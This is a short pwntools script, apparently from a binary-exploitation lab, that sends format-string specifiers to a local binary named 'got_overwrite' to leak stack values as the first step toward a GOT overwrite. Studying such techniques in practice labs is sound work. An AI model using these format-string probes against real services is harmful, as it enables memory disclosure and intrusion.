from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./got_overwrite', checksec=False)

# Create process (level used to reduce noise)
p = process(level='error')

# Let's fuzz x values
for i in range(100):
    try:
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendline('%{}$x'.format(i).encode())
        # Receive the response
        result = p.recvline().decode()
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass
